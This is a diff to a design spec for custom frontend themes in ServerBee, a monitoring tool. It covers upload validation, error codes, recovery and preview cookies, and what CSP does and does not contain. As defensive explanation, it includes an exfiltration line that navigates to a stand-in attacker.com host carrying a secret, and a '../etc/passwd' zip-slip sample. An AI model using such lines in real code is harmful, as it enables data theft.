@@ -9,7 +9,7 @@
 
 Let administrators replace the entire ServerBee frontend (login page, dashboards, settings, every route) with a custom SPA they upload as a `.sbtheme` package. The default React SPA becomes one of many possible frontends. The HTTP/WebSocket API, authentication, and Rust backend are unchanged — the theme is pure frontend that talks to the existing API.
 
-This is the "WordPress theme" model adapted to a React + Rust monitoring tool: full visual freedom, admin-only upload, browser-sandboxed execution, CSP-enforced data-exfiltration prevention.
+This is the "WordPress theme" model adapted to a React + Rust monitoring tool: full visual freedom, admin-only upload, and a clear trust statement — **themes are admin-installed trusted frontend code**, equivalent in power to an admin replacing the bundled SPA on disk. CSP is applied as defense-in-depth (it raises the bar for opportunistic exfiltration vectors like remote image beacons and external script loads) but is **not** a containment boundary; a malicious admin-installed theme can read anything the admin can read via same-origin APIs and can exfiltrate via top-level navigation. If untrusted theme execution ever becomes a requirement, that is a separate redesign (sandboxed iframe on a distinct origin, scoped postMessage RPC, no shared cookies) and is out of scope for this spec.
 
 ## Non-goals (v1)
 
@@ -22,7 +22,7 @@ This is the "WordPress theme" model adapted to a React + Rust monitoring tool: f
 - Auto-upgrade on new version upload (admin must explicitly activate)
 - Theme that ships its own backend assets, Rust crates, or migrations
 
-These constraints keep v1 implementable in one development cycle and confine the security model to "admin trusts themselves; CSP contains blast radius."
+These constraints keep v1 implementable in one development cycle. The security model is "admin-installed = trusted, same as replacing the bundled SPA on disk." CSP is defense-in-depth, not containment.
 
 ---
 
@@ -44,13 +44,11 @@ These constraints keep v1 implementable in one development cycle and confine the
 │  └─────────────────────┘                           │ read      │
 │                                                    ▼           │
 │         ┌──────────────────────────────────────────────────┐   │
-│         │  Axum route handler (catch-all `/*`)             │   │
-│         │  if cookie sb_force_default || query theme=def   │   │
-│         │     → rust-embed default SPA                      │   │
-│         │  else if active_theme = Some(t)                   │   │
-│         │     → serve t.files[path] with CSP headers       │   │
-│         │  else                                             │   │
-│         │     → rust-embed default SPA                      │   │
+│         │  Axum route handler (catch-all `/*`)              │   │
+│         │  resolves theme to serve via the precedence in    │   │
+│         │  Section 6.5 (query string > cookies > active >   │   │
+│         │  default), then serves bytes with CSP for themes  │   │
+│         │  or rust-embed for the default SPA.               │   │
 │         └──────────────────────────────────────────────────┘   │
 │                                                                  │
 │  /api/*, /api/ws/*, /swagger-ui/*, /__system/* unchanged        │
@@ -60,9 +58,10 @@ These constraints keep v1 implementable in one development cycle and confine the
 ┌─────────────────────────────────────────────────────────────────┐
 │                            BROWSER                               │
 │                                                                  │
-│  Active theme HTML/JS/CSS runs same-origin with ServerBee.       │
-│  Auth via existing session cookie (Set-Cookie from /api/auth).  │
-│  CSP restricts connect-src to 'self' — no exfiltration possible. │
+│  Active theme HTML/JS/CSS runs same-origin with ServerBee, with │
+│  the user's session cookie. Theme has the same data-access      │
+│  authority as the user. Trust model: admin-installed = trusted. │
+│  CSP is defense-in-depth, not a containment boundary.           │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -92,7 +91,7 @@ These constraints keep v1 implementable in one development cycle and confine the
 | `preview_data` | BLOB NULL | Extracted preview image (≤ 500KB) |
 | `preview_mime` | TEXT NULL | e.g. `image/png` |
 | `size_bytes` | INTEGER NOT NULL | Package size (uncompressed total of allowed files) |
-| `uploaded_by` | INTEGER NOT NULL | FK → `users.id` |
+| `uploaded_by` | TEXT NOT NULL | FK → `users.id` (`users.id` is `TEXT` per `crates/server/src/entity/user.rs:6`) |
 | `uploaded_at` | TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP |
 | `is_superseded` | INTEGER NOT NULL DEFAULT 0 | 1 when a newer version of the same `manifest_id` was uploaded |
 
@@ -109,7 +108,7 @@ Stored via the existing `ConfigService` KV store (used today for `ACTIVE_THEME_K
 
 Storing the UUID (not the numeric id) keeps the value stable across re-imports and matches what the API surface accepts.
 
-When a row is deleted, the service layer deactivates first (clears the config key) — no foreign key, no cascade. If the stored uuid is dangling (row deleted out of band), the runtime falls back to the default SPA and logs a warning, mirroring `CustomThemeService::active_theme` behavior.
+**Delete behavior** (matches `CustomThemeService::delete_rejects_in_use_active_theme`): the service rejects `DELETE` on the active theme with HTTP 409 `THEME_IN_USE`. The admin must deactivate first via `PUT /api/settings/active-spa-theme {theme_id: null}` and then delete. There is no auto-deactivate-on-delete path. If the stored uuid is dangling (row deleted out of band, e.g. via direct DB edit), the runtime falls back to the default SPA and logs a warning, mirroring `CustomThemeService::active_theme`.
 
 ### 2.3 Audit log
 
@@ -135,9 +134,10 @@ acme-dashboard.sbtheme
 ├── manifest.json       (required)
 ├── index.html          (required, default entry; path can be overridden in manifest)
 ├── assets/             (optional; conventional location for built JS/CSS/images)
-├── preview.png         (optional; shown on theme card)
-└── README.md           (optional; not served)
+└── preview.png         (optional; shown on theme card)
 ```
+
+The package may only contain files whose extension is in the whitelist (Section 3.2). Documentation, README, license files, etc. should be distributed alongside the theme (e.g. in the source repo), not inside the `.sbtheme` package — the server never serves them and they only inflate the size budget.
 
 ### 3.1 `manifest.json` schema
 
@@ -187,11 +187,14 @@ acme-dashboard.sbtheme
 ```
 POST /api/settings/spa-themes (multipart/form-data, field: package)
     │
+    ├─ route-level: DefaultBodyLimit::max(25 * 1024 * 1024)
+    │  ↑ REQUIRED. Axum Multipart's default is 2 MB; without this layer the
+    │    25 MB cap is unreachable and uploads silently truncate. Mirror the
+    │    pattern at crates/server/src/router/api/file.rs:133.
     ├─ require_admin middleware
-    ├─ content-length pre-check (≤ 25 MB)
     │
     ▼
-1. Read multipart body into Vec<u8> (bounded)
+1. Read multipart `package` field into Vec<u8>
 2. Open as zip (zip crate)
 3. Iterate entries:
    - Reject ../, abs paths, drive letters, symlinks, duplicates
@@ -212,23 +215,83 @@ POST /api/settings/spa-themes (multipart/form-data, field: package)
 
 ### 4.1 Error contract
 
-All failures return:
+The current shared `ErrorDetail` (`crates/server/src/error.rs:27`) only has `code: String` and `message: String`, with `code` populated from a coarse HTTP-status-bucket enum (`BAD_REQUEST`, `VALIDATION_ERROR`, …). The spec needs finer-grained, stable codes for the upload pipeline so the frontend can localize messages and tests can assert on specific failures.
+
+**Prerequisite change** to `crates/server/src/error.rs` (additive, backward compatible):
+
+1. Extend `ErrorDetail` with an optional structured payload:
+
+   ```rust
+   pub struct ErrorDetail {
+       pub code: String,
+       pub message: String,
+       #[serde(skip_serializing_if = "Option::is_none")]
+       pub details: Option<serde_json::Value>,
+   }
+   ```
+
+   Existing callers do not populate `details`; the field is omitted from JSON when absent, so existing API responses are byte-identical.
+
+2. Add an `AppError::Domain` variant that carries a domain-specific code and optional details:
+
+   ```rust
+   #[error("{message}")]
+   Domain {
+       status: StatusCode,
+       code: &'static str,
+       message: String,
+       details: Option<serde_json::Value>,
+   },
+   ```
+
+   `IntoResponse` for `Domain` uses the variant's own `status` and `code`, and copies `details` into the response body.
+
+3. SPA theme code defines a small `SpaThemeError` enum that converts into `AppError::Domain` with the appropriate status/code, e.g.:
+
+   ```rust
+   SpaThemeError::ZipSlip { entry } 
+       → AppError::Domain { 
+           status: BAD_REQUEST, 
+           code: "ZIP_SLIP", 
+           message: "package contains unsafe path", 
+           details: Some(json!({ "entry": entry })),
+       }
+   ```
+
+With this in place, the spec's contract is:
 
 ```json
 {
   "error": {
-    "code": "INVALID_MANIFEST" | "ZIP_SLIP" | "FILE_TOO_LARGE" | "TOO_MANY_FILES" |
-            "TOTAL_SIZE_EXCEEDED" | "ZIP_BOMB" | "SYMLINK_NOT_ALLOWED" |
-            "DUPLICATE_ENTRY" | "DISALLOWED_EXTENSION" | "MISSING_MANIFEST" |
-            "MISSING_ENTRY" | "NO_DOWNGRADE" | "VERSION_EXISTS" |
-            "INCOMPATIBLE_VERSION" | "PREVIEW_TOO_LARGE" | "UPLOAD_TOO_LARGE",
-    "message": "human-readable English",
-    "details": { "field": "...", "value": "...", "limit": 5242880 }
+    "code": "ZIP_SLIP",
+    "message": "package contains unsafe path",
+    "details": { "entry": "../etc/passwd" }
   }
 }
 ```
 
-Error code set is stable across versions for i18n in the frontend.
+Stable code set (used by frontend i18n and integration tests):
+
+| code | HTTP | when |
+|---|---|---|
+| `UPLOAD_TOO_LARGE` | 413 | multipart body exceeds 25 MB hard cap |
+| `MISSING_MANIFEST` | 400 | no `manifest.json` in package |
+| `INVALID_MANIFEST` | 400 | manifest fails schema validation (details.field names it) |
+| `MISSING_ENTRY` | 400 | `entry` path not present in package |
+| `INCOMPATIBLE_VERSION` | 400 | `min_serverbee_version` > running version |
+| `ZIP_SLIP` | 400 | entry path escapes package root |
+| `ZIP_BOMB` | 400 | compression ratio > 100× on a single entry |
+| `SYMLINK_NOT_ALLOWED` | 400 | zip entry has symlink mode bits |
+| `DUPLICATE_ENTRY` | 400 | same path appears twice |
+| `DISALLOWED_EXTENSION` | 400 | file extension not in whitelist |
+| `FILE_TOO_LARGE` | 400 | single file > 5 MB |
+| `TOO_MANY_FILES` | 400 | > 1000 files |
+| `TOTAL_SIZE_EXCEEDED` | 400 | uncompressed total > 20 MB |
+| `PREVIEW_TOO_LARGE` | 400 | preview image > 500 KB |
+| `NO_DOWNGRADE` | 400 | upload version < newest existing for same id |
+| `VERSION_EXISTS` | 409 | upload version equal to an existing row for same id |
+| `THEME_IN_USE` | 409 | DELETE on the currently active theme |
+| `THEME_NOT_FOUND` | 404 | uuid does not exist |
 
 ### 4.2 What we deliberately do NOT do
 
@@ -268,13 +331,15 @@ On server start, after migrations:
 
 ### 5.3 Activation flow
 
+Activation is a global, irreversible-without-recovery commit. There is no per-tab "stay on default" — cookies are origin-scoped, not tab-scoped, so any attempt to make activation tab-local would be a lie. Instead, the UI's safety net is the **preview** mechanism (Section 6.4): admin previews via `?theme=preview:<uuid>` first, then activates.
+
 ```
 PUT /api/settings/active-spa-theme  { theme_id: <uuid> | null }
     │
     ├─ require_admin
     ▼
 1. If body.theme_id is null:
-   - Clear ACTIVE_SPA_THEME_KEY (delete config row or store empty string)
+   - Clear ACTIVE_SPA_THEME_KEY
    - active_spa_theme.store(Arc::new(None))
    - audit: spa_theme.deactivate (detail captures the previous uuid)
    - 200
@@ -284,31 +349,30 @@ PUT /api/settings/active-spa-theme  { theme_id: <uuid> | null }
    - Store row.uuid under ACTIVE_SPA_THEME_KEY
    - active_spa_theme.store(Arc::new(Some(loaded)))
    - audit: spa_theme.activate
-   - Set-Cookie: sb_force_default=1; Path=/; Max-Age=3600; HttpOnly; SameSite=Strict
-     ↑ ensures the activating admin's current tab stays on default SPA
    - 200 with { activated_uuid }
 ```
+
+The admin's current tab continues to show whatever it was showing until the next request to a root-serving path. Reloading their tab will pick up the new theme. If they instead want to verify the new theme before committing site-wide, they should use preview first (Section 6.4).
 
 ### 5.4 Serve path
 
 Router order (existing routes preserved):
 
 ```
-/api/*              → existing handlers
+/api/*              → existing handlers (themes cannot shadow)
 /api/ws/*           → existing handlers
 /swagger-ui/*       → existing
 /api-docs/*         → existing
-/__system/*         → new reserved prefix (Section 6.3)
-/?theme=default     → matched in middleware (Section 6.2)
-/*                  → SPA serve handler:
-                       1. If cookie sb_force_default present → default SPA
-                       2. If query theme=default present (any path) → default SPA + set cookie
-                       3. If active_spa_theme.load() is Some(t):
-                          - Normalize requested path; default to t.entry for `/`
-                          - If t.files contains path → 200 + bytes + CSP + content-type
-                          - Else if t.files contains t.entry → 200 + entry HTML (SPA history routing)
-                          - Else → 404
-                       4. Otherwise → rust-embed default SPA (existing behavior)
+/__system/*         → new reserved prefix (Section 6.4)
+/*                  → SPA serve handler, follows the precedence in Section 6.5
+                      to choose default vs preview vs active vs default-fallback;
+                      then for the chosen theme:
+                       - Normalize requested path; default to t.entry for `/`
+                       - If t.files contains path → 200 + bytes + CSP + content-type
+                       - Else if t.files contains t.entry → 200 + entry HTML
+                         (catches SPA history routing for arbitrary deep paths)
+                       - Else → 404
+                      The default SPA case is served by rust-embed exactly as today.
 ```
 
 ### 5.5 CSP headers (theme responses only)
@@ -329,9 +393,14 @@ X-Frame-Options: DENY
 Referrer-Policy: same-origin
 ```
 
-`connect-src 'self'` is the load-bearing directive: it prevents the theme from sending the user's session cookie or any data to attacker-controlled domains. `unsafe-eval` is included pragmatically (Vue runtime, wasm-bindgen, etc. require it); the default SPA uses a stricter CSP without `unsafe-eval`.
+**What this CSP does and does not do**:
+- Blocks remote script tags, stylesheets, images, fonts, fetch/XHR/WebSocket, iframe embedding, form posts to other origins — i.e. opportunistic exfiltration via passive resource loads.
+- Does **not** block top-level navigation exfiltration (`location.href = 'https://attacker.com/?secret=' + ...`). The CSP3 `navigate-to` directive that would cover this is not supported by browsers in practice.
+- Does **not** prevent the theme from reading any data the current user can read via same-origin API (it has the session cookie).
 
-The default SPA's CSP is unchanged.
+`unsafe-eval` is included pragmatically — most React/Vue/Svelte/wasm-bindgen builds require it. Stricter exclusion is parked as Open Question 2.
+
+The default SPA continues to be served by the existing static handler, which does not currently set CSP. This spec does not change that — adding CSP to the default SPA is out of scope. The headers above apply only to responses that serve a custom theme's files.
 
 ### 5.6 Caching
 
@@ -347,32 +416,55 @@ The default SPA's CSP is unchanged.
 
 A custom SPA replaces the *entire* UI, including the page admins use to switch themes. A broken or malicious theme can lock everyone out. Three layered escape hatches:
 
-### 6.2 `?theme=default` query parameter
+### 6.2 `?theme=default` query parameter (recovery)
 
-Any request with `?theme=default` in the query string returns the default SPA, regardless of the active-theme pointer. The handler additionally sets `Set-Cookie: sb_force_default=1; Max-Age=3600` so subsequent SPA history navigations (which lose the query) stay on the default.
+Any request with `?theme=default` in the query string returns the default SPA, regardless of the active-theme pointer. To survive SPA client-side navigations that drop the query string, the handler also sets `Set-Cookie: sb_force_default=1; Path=/; Max-Age=3600; SameSite=Strict` (no `HttpOnly` — the recovery UI may want to surface or clear it). Once set, the cookie keeps the entire origin on the default SPA for one hour.
 
-To clear the cookie: `GET /__system/clear-recovery` returns 204 and sets `Set-Cookie: sb_force_default=; Max-Age=0`.
+To exit recovery: visit `?theme=default` and click "Exit recovery" (which calls `POST /__system/clear-recovery`, clearing the cookie). Or visit `?theme=active` once, which clears the cookie and forces serving the currently active theme for that request.
 
-### 6.3 `/__system/*` reserved prefix
+### 6.3 `?theme=preview:<uuid>` query parameter (preview-before-activate)
+
+Admin-only. Serves the specified theme for the current request **without** changing `ACTIVE_SPA_THEME_KEY`. The handler also sets `Set-Cookie: sb_preview_theme=<uuid>; Path=/; Max-Age=900; SameSite=Strict` so SPA client-side navigation within the preview tab continues to serve that theme.
+
+This is the safety net replacing the previous (broken) "tab-local default" idea. Flow:
+
+1. Admin uploads theme `<uuid>`
+2. Admin clicks "Preview" → new tab opens to `/?theme=preview:<uuid>`
+3. Admin browses the theme, validates it works
+4. Admin returns to the default-SPA tab and clicks "Activate" → global active flips
+5. The preview cookie expires in 15 minutes; or admin can manually clear it by visiting `?theme=active` or `?theme=default`
+
+The preview cookie does not need `HttpOnly`. It only affects which theme is served; the actual session cookie is separate.
+
+Validator note: only admins can set the preview cookie. The handler checks the request's session before serving a preview theme; non-admins get the active theme (or default) regardless of the query string.
+
+### 6.4 `/__system/*` reserved prefix
 
 Routes under `/__system/*` are always served by the default SPA, never overridden by a custom theme. v1 routes:
 
-- `/__system/clear-recovery` — clear `sb_force_default` cookie
+- `POST /__system/clear-recovery` — clear `sb_force_default` cookie
+- `POST /__system/clear-preview` — clear `sb_preview_theme` cookie
 - `/__system/admin/spa-themes` — admin-only theme management page (default SPA)
 
 Themes are forbidden from declaring entries that would collide with `/__system/*` (validator rejects packages with such paths, although in practice they'd just be unreachable).
 
-### 6.4 Activation safety net (UI-side)
+### 6.5 Cookie precedence on the serve path
 
-After successful `PUT /api/settings/active-spa-theme`, the admin's *current* tab stays on the default SPA (via `sb_force_default` cookie set in the activation response). The UI shows a modal:
+When deciding what to serve for a `GET /<path>` request:
 
 ```
-Theme activated.
-- Open in new tab    → window.open('/', '_blank') — sees new theme (no cookie)
-- Apply to this tab  → clear cookie, location.reload() — switches to new theme
+1. If query string contains theme=default → serve default SPA, set sb_force_default cookie
+2. Else if query string contains theme=preview:<uuid> and caller is admin
+   → serve that theme, set sb_preview_theme cookie
+3. Else if query string contains theme=active
+   → clear both sb_force_default and sb_preview_theme cookies, serve active (or default if none)
+4. Else if sb_force_default cookie present → serve default SPA
+5. Else if sb_preview_theme cookie present and caller is admin → serve that theme
+6. Else if ACTIVE_SPA_THEME_KEY is set → serve active theme
+7. Else → serve default SPA (rust-embed)
 ```
 
-The admin can preview safely before committing their own session.
+This precedence is deterministic and testable end-to-end.
 
 ---
 
@@ -402,18 +494,19 @@ A new top section `CustomSpaThemeSection` lives in `apps/web/src/routes/_authed/
 ### 8.1 Components
 
 - `CustomSpaThemeSection` — orchestrator, warning banner, grid layout
-- `SpaThemeCard` — per-theme card with preview, manifest excerpt, active indicator, actions
+- `SpaThemeCard` — per-theme card with preview, manifest excerpt, active indicator, actions (Preview / Activate / Delete)
 - `SpaThemeUploadCard` — drag-drop + file picker, progress, error display
-- `ActivateSpaThemeDialog` — confirmation modal with checkbox gate
-- `ActivationSuccessDialog` — post-activation "preview in new tab vs apply now"
+- `ActivateSpaThemeDialog` — confirmation modal with checkbox gate; copy includes recovery URL
 - `SpaThemeDetailsDrawer` — right drawer with full manifest, file list, audit history, package download
+
+The "Preview" action on each card opens `/?theme=preview:<uuid>` in a new tab (Section 6.3). This is the safety-net flow: admin previews → returns to the management tab on the default SPA → clicks Activate. No post-activation modal is needed because the admin has already validated the theme via preview.
 
 ### 8.2 API hooks (in `apps/web/src/api/spa-themes.ts`)
 
 - `useSpaThemes()` — list, React Query
 - `useUploadSpaTheme()` — multipart, with progress
 - `useDeleteSpaTheme()`
-- `useActivateSpaTheme()` — also handles the `sb_force_default` cookie set by the server
+- `useActivateSpaTheme()` — `PUT /api/settings/active-spa-theme`
 - `useActiveSpaTheme()`
 
 ### 8.3 Behavioural rules
@@ -437,7 +530,7 @@ Contents:
 serverbee-theme-starter/
 ├── manifest.json
 ├── package.json              # bun + vite + typescript
-├── vite.config.ts            # base: './' so assets resolve relatively
+├── vite.config.ts            # base: '/' (REQUIRED for SPA history routing — see note)
 ├── index.html
 ├── public/preview.png
 ├── src/
@@ -450,6 +543,8 @@ serverbee-theme-starter/
 ```
 
 `pack.ts` runs `vite build`, validates the output against the same constraints the server enforces (size, count, extensions), and produces a deterministic zip.
+
+**Why `base: '/'` and not `'./'`**: themes are always served from `/`, but the server falls back to the theme's entry HTML for arbitrary deep paths to support SPA history routing (Section 5.4). With `base: './'`, a reload at `/servers/abc` would request `./assets/app.js` and resolve it to `/servers/assets/app.js` → 404. `base: '/'` produces absolute asset URLs (`/assets/app.js`) that resolve correctly regardless of the current SPA route. Themes do not need to support being served from a sub-path; if that ever changes, the design will revisit.
 
 ### 9.2 Documentation
 
@@ -523,18 +618,22 @@ Fixture packages live under `crates/server/tests/fixtures/spa_themes/`.
 
 - [ ] Admin uploads starter theme → succeeds
 - [ ] Non-admin does not see Custom Frontend section
-- [ ] Activation shows preview-in-new-tab vs apply-now choice
-- [ ] New tab shows new theme; current tab stays on default
-- [ ] Apply-now reloads current tab into new theme
-- [ ] `?theme=default` recovers from any custom theme
+- [ ] `?theme=preview:<uuid>` (admin) renders that theme without changing active
+- [ ] `?theme=preview:<uuid>` (non-admin) ignores the preview and renders the active theme
+- [ ] Activation commits globally; refreshing any tab shows the new theme
+- [ ] `?theme=default` recovers from any custom theme; cookie keeps recovery sticky across SPA nav
+- [ ] `?theme=active` exits recovery and preview, clears both cookies
 - [ ] Deactivate restores default SPA for all clients on next request
 - [ ] Delete non-active theme succeeds
-- [ ] Delete active theme rejected with clear message
+- [ ] Delete active theme rejected with HTTP 409 `THEME_IN_USE`
 - [ ] Zip-slip fixture rejected with `ZIP_SLIP` error code
 - [ ] Zip-bomb fixture rejected with `ZIP_BOMB` error code
-- [ ] CSP headers present on theme responses (verified in DevTools)
+- [ ] Upload > 25 MB rejected with `UPLOAD_TOO_LARGE` (not silently truncated)
+- [ ] CSP headers present on theme responses (verified in DevTools); absent on default SPA
+- [ ] Theme with `base: '/'` reloads correctly at deep SPA paths (e.g. `/servers/abc`)
 - [ ] Version upgrade: v1.0 → v1.1 succeeds and does not auto-activate
-- [ ] Version downgrade: v1.1 → v1.0 rejected
+- [ ] Version downgrade: v1.1 → v1.0 rejected with `NO_DOWNGRADE`
+- [ ] Same id + same version rejected with `VERSION_EXISTS`
 - [ ] Audit log shows upload/activate/deactivate/delete events
 
 ---
@@ -572,6 +671,5 @@ This feature does not need a server capability bit (themes execute in the browse
 
 These do not block the design but should be resolved during implementation planning:
 
-1. Starter template Vite base-path strategy: `base: './'` (relative assets, simplest) vs `base: '/'` (absolute, requires no path rewriting but harder if theme assets are ever served from a sub-path). v1 recommendation: `base: './'`, with the documented constraint that themes are always served from `/`. Decide for sure when authoring the starter.
-2. Whether to keep the `package_data` BLOB in `spa_themes` after extraction. Pros of keeping: source of truth for download/re-extraction; cons: doubles SQLite size. v1 recommendation: keep it (20 MB cap makes the cost bounded), revisit if storage becomes an issue.
-3. Whether `unsafe-eval` in the theme CSP should be opt-in via a manifest field rather than always-on. v1 recommendation: always-on for v1 (most React/Vue/Svelte builds need it); add `manifest.csp.allow_eval: false` as an opt-out in a later version if theme authors care.
+1. Whether to keep the `package_data` BLOB in `spa_themes` after extraction. Pros of keeping: source of truth for download/re-extraction; cons: doubles SQLite size. v1 recommendation: keep it (20 MB cap makes the cost bounded), revisit if storage becomes an issue.
+2. Whether `unsafe-eval` in the theme CSP should be opt-in via a manifest field rather than always-on. v1 recommendation: always-on for v1 (most React/Vue/Svelte builds need it); add `manifest.csp.allow_eval: false` as an opt-out in a later version if theme authors care.
